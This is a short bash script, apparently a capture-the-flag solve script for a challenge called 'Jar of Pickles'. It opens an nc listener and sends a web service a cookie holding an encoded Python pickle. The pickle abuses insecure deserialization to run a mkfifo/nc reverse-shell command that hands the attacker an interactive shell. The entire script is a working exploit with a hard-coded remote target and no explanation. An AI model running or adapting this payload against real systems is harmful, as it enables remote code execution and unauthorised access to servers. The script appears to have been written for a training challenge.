#!/bin/bash

PORT=8007

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.101:'$PORT
else
    URL='http://'$1':'$2
fi

# Jar of Pickles
echo "Start exploit for Jar of Pickles"
echo "Flag is"

nc -nvlk 1234 | curl $URL'/jar' -s -H 'Cookie: pickles=gANjcG9zaXgKc3lzdGVtCnEAWFMAAABybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI-JjEgfCBuYyAxMjcuMC4wLjEgMTIzNCA-IC90bXAvZnEBhXECUnEDLg=='; ls
